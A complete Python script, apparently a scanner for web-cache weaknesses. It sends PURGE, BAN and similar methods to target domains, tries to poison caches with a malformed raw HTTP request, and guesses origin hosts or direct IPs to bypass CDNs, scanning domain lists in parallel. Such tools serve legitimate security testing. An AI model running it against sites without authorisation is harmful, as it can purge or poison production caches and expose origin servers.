#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import csv
import json
import random
import socket
import ssl
import string
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse

import requests

# =========================
# Config & constants
# =========================
CACHE_METHODS = ["PURGE", "BAN", "REFRESH", "INVALIDATE"]

STATIC_CANDIDATES = [
    "/robots.txt",
    "/favicon.ico",
    "/apple-touch-icon.png",
    "/apple-touch-icon-precomposed.png",
    "/humans.txt",
    "/sitemap.xml",
    "/static/logo.png",
    "/assets/logo.png",
    "/logo.png",
    "/index.html",
]

DEFAULT_TIMEOUT = 12
DEFAULT_THREADS = 1
DEFAULT_UA = "cache-scanner/2.0 (+https://security-tests.local)"

# Common cache/CDN header keys for detection
CACHE_HEADER_KEYS = {
    "x-cache",
    "x-cache-hits",
    "x-cache-remote",
    "x-varnish",
    "x-served-by",
    "x-proxy-cache",
    "x-proxy-cache-info",
    "cf-cache-status",
    "cf-ray",
    "age",
    "cache-control",
    "x-fastly-request-id",
    "x-cacheable",
    "x-akamai-staging",
    "x-akamai-session-info",
    "x-amz-cf-pop",
    "x-amz-cf-id",
    "x-squid-cache",
}

# Origin-bypass hostname guesses (tried if --try-origin enabled)
ORIGIN_HOST_GUESSES = [
    "origin", "backend", "direct", "real", "raw", "edge", "edgesrv",
    "server", "app", "api", "cdn", "files", "assets",
]

# =========================
# ANSI Styling
# =========================
BLINK = "\033[5m"
RED_BG = "\033[1;97;41m"     # white text, red background
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
DIM = "\033[2m"
RESET = "\033[0m"

# Thread-safe file writes
write_lock = threading.Lock()


# =========================
# Helpers
# =========================
def normalize_url(target: str) -> str:
    """Ensure scheme present; return 'https://host' form."""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target.strip()
    p = urlparse(target)
    # Keep only scheme://netloc
    return f"{p.scheme}://{p.netloc}"

def choose_test_path(base_url: str, timeout: int, verify_tls: bool, ua: str) -> str:
    """Pick a small, likely-static path for reliable cache testing."""
    headers = {"User-Agent": ua}
    for path in STATIC_CANDIDATES:
        try:
            r = requests.get(
                base_url + path, headers=headers, timeout=timeout,
                verify=verify_tls, allow_redirects=True,
            )
            if r.status_code in (200, 204) and len(r.content) <= 200_000:
                return path
        except requests.RequestException:
            continue
    return "/"

def rand_token(n=10) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def get_cache_signals(headers: requests.structures.CaseInsensitiveDict):
    """Extract common cache signals."""
    d = {k.lower(): v for k, v in headers.items()}
    xcache = d.get("x-cache", "")
    xcache_hits = d.get("x-cache-hits", "")
    cfstatus = d.get("cf-cache-status", d.get("cf-cache-status".title(), ""))
    age = d.get("age")
    cache_control = d.get("cache-control", "")
    return xcache, xcache_hits, cfstatus, age, cache_control

def looks_cached(headers) -> bool:
    """Heuristic: any indication we’re dealing with a caching layer."""
    xcache, xcache_hits, cfstatus, age, cache_control = get_cache_signals(headers)
    try_age = False
    try:
        try_age = age is not None and int(age) >= 0
    except Exception:
        try_age = False
    return any([
        "HIT" in str(xcache).upper(),
        str(xcache_hits).isdigit() and int(xcache_hits) >= 0,
        str(cfstatus).upper() in {"HIT", "MISS", "EXPIRED", "REVALIDATED", "STALE", "BYPASS", "DYNAMIC"},
        try_age,
        "max-age" in cache_control.lower()
    ])

def verify_purge_effect(base_url: str, path: str, timeout: int, verify_tls: bool, ua: str) -> bool:
    """
    Confirm a purge by comparing before/after requests:
      - Age decreases (or resets)
      - X-Cache flips HIT->MISS (or similar)
      - Body length changes
    """
    headers = {"User-Agent": ua}
    try:
        before = requests.get(base_url + path, headers=headers, timeout=timeout, verify=verify_tls)
        before_age = before.headers.get("Age")
        before_x = before.headers.get("X-Cache", "")
        before_len = len(before.content)

        purge = requests.request("PURGE", base_url + path, headers=headers, timeout=timeout, verify=verify_tls)
        if purge.status_code not in (200, 204):
            return False

        after = requests.get(base_url + path, headers=headers, timeout=timeout, verify=verify_tls)
        after_age = after.headers.get("Age")
        after_x = after.headers.get("X-Cache", "")
        after_len = len(after.content)

        age_reset = False
        try:
            if before_age is not None and after_age is not None:
                age_reset = int(after_age) < int(before_age)
        except ValueError:
            age_reset = False

        x_flip = ("HIT" in before_x.upper() and "MISS" in after_x.upper())
        len_change = before_len != after_len

        return bool(age_reset or x_flip or len_change)
    except requests.RequestException:
        return False

def raw_poison_request(host: str, path: str, port=443, timeout: int = DEFAULT_TIMEOUT, sni_host: str = None):
    """
    Send a raw HTTP/1.1 request with an extra line containing a single dot,
    per the blog technique:
        GET /random HTTP/1.1
        Host: example.com
        .
    Returns: (status_code, headers_dict, body_bytes)
    """
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: cache-scanner/2.0\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f".\r\n"
    ).encode("ascii", errors="ignore")

    context = ssl.create_default_context()
    context.check_hostname = True

    with socket.create_connection((host, port), timeout=timeout) as sock:
        with context.wrap_socket(sock, server_hostname=sni_host or host) as ssock:
            ssock.sendall(req)
            ssock.settimeout(timeout)
            chunks = []
            try:
                while True:
                    data = ssock.recv(65536)
                    if not data:
                        break
                    chunks.append(data)
            except socket.timeout:
                pass
    raw = b"".join(chunks)

    # Parse best-effort
    try:
        header_blob, body = raw.split(b"\r\n\r\n", 1)
    except ValueError:
        return None, {}, raw

    lines = header_blob.split(b"\r\n")
    status_line = lines[0].decode("iso-8859-1", errors="ignore")
    status_code = None
    if status_line.startswith("HTTP/"):
        parts = status_line.split()
        if len(parts) >= 2 and parts[1].isdigit():
            status_code = int(parts[1])

    headers = {}
    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            headers[k.decode("iso-8859-1", errors="ignore").strip()] = v.decode("iso-8859-1", errors="ignore").strip()
    return status_code, headers, body

def attempt_poisoning(base_url: str, timeout: int, verify_tls: bool, ua: str) -> tuple:
    """
    Try to poison-cache a random path using the extra-line trick.
    If subsequent normal GET shows cache HIT-ish signals => likely critical.
    Returns: (is_critical, rand_path, details_dict)
    """
    p = urlparse(base_url)
    host = p.netloc
    rand_path = f"/cacheprobe_{rand_token(8)}.txt"

    raw_status, raw_headers, _ = raw_poison_request(host, rand_path, port=443, timeout=timeout)

    headers = {"User-Agent": ua}
    try:
        r = requests.get(base_url + rand_path, headers=headers, timeout=timeout, verify=verify_tls, allow_redirects=True)
        xcache, xcache_hits, cfstatus, age, _ = get_cache_signals(r.headers)

        hitish = (
            "HIT" in str(xcache).upper()
            or (str(cfstatus).upper() == "HIT")
            or (str(xcache_hits).isdigit() and int(xcache_hits) > 0)
            or (age and age.isdigit() and int(age) > 0)
        )
        if r.status_code in (200, 204) and hitish:
            return True, rand_path, {
                "status": r.status_code,
                "X-Cache": xcache,
                "X-Cache-Hits": xcache_hits,
                "CF-Cache-Status": cfstatus,
                "Age": age,
                "raw_status": raw_status,
                "raw_hdr_X-Cache": raw_headers.get("X-Cache"),
                "raw_hdr_X-Cache-Hits": raw_headers.get("X-Cache-Hits"),
                "raw_CF-Cache-Status": raw_headers.get("CF-Cache-Status") or raw_headers.get("Cf-Cache-Status")
            }
        return False, rand_path, {
            "status": r.status_code,
            "X-Cache": xcache,
            "X-Cache-Hits": xcache_hits,
            "CF-Cache-Status": cfstatus,
            "Age": age,
            "raw_status": raw_status,
        }
    except requests.RequestException as e:
        return False, rand_path, {"error": str(e), "raw_status": raw_status}

def try_methods_and_verify(base_url: str, path: str, timeout: int, verify_tls: bool, ua: str):
    """Run cache methods and try to verify PURGE effect."""
    headers = {"User-Agent": ua}
    results = []
    possible_vuln = False
    for m in CACHE_METHODS:
        try:
            resp = requests.request(m, base_url + path, headers=headers, timeout=timeout, verify=verify_tls)
            status = resp.status_code
            if m == "PURGE" and status in (200, 204):
                if verify_purge_effect(base_url, path, timeout, verify_tls, ua):
                    possible_vuln = True
                    results.append(f"{m}: {status} (verified)")
                else:
                    results.append(f"{m}: {status} (unverified)")
            else:
                results.append(f"{m}: {status}")
        except requests.RequestException as e:
            results.append(f"{m}: error ({e})")
    return possible_vuln, results

def resolve_ips(host: str):
    """Return a list of IPv4/IPv6 addresses for a hostname (best effort)."""
    ips = set()
    try:
        for fam, _, _, _, sockaddr in socket.getaddrinfo(host, 443):
            ip = sockaddr[0]
            ips.add(ip)
    except socket.gaierror:
        pass
    return list(ips)

def attempt_origin_bypass_hosts(host: str):
    """
    Generate candidate origin hostnames:
      - replace www <-> apex
      - prepend common origin labels
    """
    cands = set()
    # Basic swap www
    if host.startswith("www."):
        cands.add(host[4:])
    else:
        cands.add("www." + host)

    # Prepend guesses
    for label in ORIGIN_HOST_GUESSES:
        cands.add(f"{label}.{host}")

    return list(cands)

def http_get(base_url: str, path: str, ua: str, timeout: int, verify_tls: bool):
    headers = {"User-Agent": ua}
    return requests.get(base_url + path, headers=headers, timeout=timeout, verify=verify_tls, allow_redirects=True)

def test_one_target(target: str, args):
    """
    Full flow per target:
      1) Normalize & choose test path
      2) Baseline GET & detect caching
      3) Methods (PURGE, ...) & verify
      4) Poisoning attempt
      5) Optional origin bypass attempts:
         - Try candidate origin hostnames
         - Try direct IP with Host header (requires --insecure to avoid TLS errors)
    """
    base_url = normalize_url(target)
    verify_tls = not args.insecure
    ua = args.user_agent
    timeout = args.timeout

    # 1) pick path
    test_path = choose_test_path(base_url, timeout, verify_tls, ua)

    # 2) baseline
    try:
        r0 = http_get(base_url, test_path, ua, timeout, verify_tls)
    except requests.RequestException as e:
        return {
            "target": target, "status": "ERROR", "path": test_path,
            "info": f"Connection error: {e}", "details": None
        }

    caching_present = looks_cached(r0.headers)

    # 3) methods
    possible_vuln, method_results = try_methods_and_verify(base_url, test_path, timeout, verify_tls, ua)

    # 4) poisoning attempt
    critical, rand_path, poison_detail = attempt_poisoning(base_url, timeout, verify_tls, ua)

    # 5) origin bypass attempts (optional)
    origin_findings = []
    if args.try_origin:
        p = urlparse(base_url)
        host = p.netloc

        # (a) Try candidate origin hostnames
        for ohost in attempt_origin_bypass_hosts(host):
            try_url = f"{p.scheme}://{ohost}"
            try:
                r = http_get(try_url, test_path, ua, timeout, verify_tls)
                if r.status_code in (200, 204):
                    hitish = looks_cached(r.headers)
                    origin_findings.append({"host": ohost, "status": r.status_code, "cached_signals": hitish})
            except requests.RequestException:
                continue

        # (b) Try direct IP with Host header (SNI mismatch likely unless --insecure)
        ips = resolve_ips(host)
        for ip in ips[:5]:  # limit
            url_ip = f"{p.scheme}://{ip}"
            try:
                r = requests.get(
                    url_ip + test_path,
                    headers={"User-Agent": ua, "Host": host},
                    timeout=timeout,
                    verify=verify_tls,  # will likely fail unless --insecure
                    allow_redirects=True,
                )
                hitish = looks_cached(r.headers)
                origin_findings.append({"ip": ip, "status": r.status_code, "cached_signals": hitish, "via": "ip+Host"})
            except requests.exceptions.SSLError as e:
                origin_findings.append({"ip": ip, "status": "TLS_ERROR", "note": str(e)[:120]})
            except requests.RequestException:
                continue

    # Decide status
    if critical:
        status = "CRITICAL"
        info = f"Poisoned {rand_path} likely; methods: {', '.join(method_results)}"
    elif possible_vuln:
        status = "POSSIBLE"
        info = f"Methods: {', '.join(method_results)}"
    else:
        status = "INFO"
        more = " (no strong cache signals)" if not caching_present else ""
        info = f"Methods: {', '.join(method_results)}{more}"

    return {
        "target": target,
        "status": status,
        "path": test_path,
        "info": info,
        "poison_detail": poison_detail if critical else None,
        "origin_findings": origin_findings if args.try_origin else None,
    }

def print_result(record, args):
    status = record["status"]
    target = record["target"]
    info = record["info"]
    path = record.get("path")

    if status == "ERROR":
        print(f"{YELLOW}[ERROR]{RESET} {target} → {info}")
        return

    if status == "CRITICAL":
        banner = f"{BLINK}{RED_BG}[CRITICAL VULN]{RESET}"
        print(f"{banner} {target} → {info} | path={path}")
        det = record.get("poison_detail") or {}
        if det:
            print(f"    {CYAN}Details:{RESET} {det}")
        if args.save_critical:
            with write_lock:
                with open("CRITICAL_VULN.txt", "a", encoding="utf-8") as f:
                    f.write(f"{target} | path={path} | {info} | {json.dumps(det, ensure_ascii=False)}\n")
    elif status == "POSSIBLE":
        print(f"{RED_BG}[POSSIBLE VULN]{RESET} {target} → {info} | path={path}")
        if args.save:
            with write_lock:
                with open("POSSIBLE_VULN.txt", "a", encoding="utf-8") as f:
                    f.write(f"{target} | path={path} | {info}\n")
    else:
        print(f"{GREEN}[INFO]{RESET} {target} → {info} | path={path}")

    # Optional verbose origin notes
    if args.try_origin and record.get("origin_findings"):
        for of in record["origin_findings"]:
            if "host" in of:
                print(f"    {DIM}origin-host{RESET} {of['host']} → status={of.get('status')} cached={of.get('cached_signals')}")
            elif "ip" in of:
                print(f"    {DIM}origin-ip{RESET} {of['ip']} → status={of.get('status')} via={of.get('via','')}")

def save_json(record, fh_jsonl):
    with write_lock:
        fh_jsonl.write(json.dumps(record, ensure_ascii=False) + "\n")
        fh_jsonl.flush()

def save_csv(record, csv_writer):
    with write_lock:
        row = {
            "target": record["target"],
            "status": record["status"],
            "path": record.get("path", ""),
            "info": record.get("info", ""),
            "poison_detail": json.dumps(record.get("poison_detail"), ensure_ascii=False) if record.get("poison_detail") else "",
            "origin_findings": json.dumps(record.get("origin_findings"), ensure_ascii=False) if record.get("origin_findings") else "",
        }
        csv_writer.writerow(row)

def load_targets(args):
    if args.domain:
        return [args.domain.strip()]
    targets = []
    with open(args.list, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            s = line.strip()
            if s and not s.startswith("#"):
                targets.append(s)
    return targets

def main():
    parser = argparse.ArgumentParser(
        description="Cache Manipulation & Poisoning Scanner (PURGE/BAN/REFRESH/INVALIDATE + Poisioning + Origin Bypass)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-d", "--domain", help="Single domain/URL to test (e.g., example.com or https://example.com)")
    parser.add_argument("-l", "--list", help="File with domains/URLs (one per line)")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Parallel threads")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Per-request timeout (seconds)")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification (useful for IP+Host or labs)")
    parser.add_argument("--save", action="store_true", help="Save [POSSIBLE VULN] to POSSIBLE_VULN.txt")
    parser.add_argument("--save-critical", action="store_true", help="Save [CRITICAL VULN] to CRITICAL_VULN.txt")
    parser.add_argument("--jsonl", help="Save all results to JSON Lines file")
    parser.add_argument("--csv", help="Save all results to CSV file")
    parser.add_argument("--user-agent", default=DEFAULT_UA, help="Custom User-Agent")
    parser.add_argument("--try-origin", action="store_true", help="Attempt origin-bypass hosts and direct IP with Host header")
    args = parser.parse_args()

    if not args.domain and not args.list:
        parser.error("Provide -d <domain> or -l <file>")

    targets = load_targets(args)
    if not targets:
        print(f"{YELLOW}[WARN]{RESET} No targets to scan.")
        sys.exit(1)

    # Prep outputs
    jsonl_fh = open(args.jsonl, "a", encoding="utf-8") if args.jsonl else None
    csv_fh = open(args.csv, "a", encoding="utf-8", newline="") if args.csv else None
    csv_writer = None
    if csv_fh:
        csv_writer = csv.DictWriter(csv_fh, fieldnames=["target", "status", "path", "info", "poison_detail", "origin_findings"])
        # Write header if file is empty
        if csv_fh.tell() == 0:
            csv_writer.writeheader()

    # Prepare vuln text files
    if args.save:
        open("POSSIBLE_VULN.txt", "w", encoding="utf-8").close()
    if args.save_critical:
        open("CRITICAL_VULN.txt", "w", encoding="utf-8").close()

    # Silence TLS warnings if user asked for --insecure
    if args.insecure:
        requests.packages.urllib3.disable_warnings()

    print(f"\n[+] Starting cache scan at {datetime.utcnow().isoformat()}Z on {len(targets)} target(s)...\n")

    if args.threads > 1:
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {pool.submit(test_one_target, t, args): t for t in targets}
            for fut in as_completed(futures):
                rec = fut.result()
                print_result(rec, args)
                if jsonl_fh:
                    save_json(rec, jsonl_fh)
                if csv_writer:
                    save_csv(rec, csv_writer)
    else:
        for t in targets:
            rec = test_one_target(t, args)
            print_result(rec, args)
            if jsonl_fh:
                save_json(rec, jsonl_fh)
            if csv_writer:
                save_csv(rec, csv_writer)

    if jsonl_fh:
        jsonl_fh.close()
    if csv_fh:
        csv_fh.close()

if __name__ == "__main__":
    main()
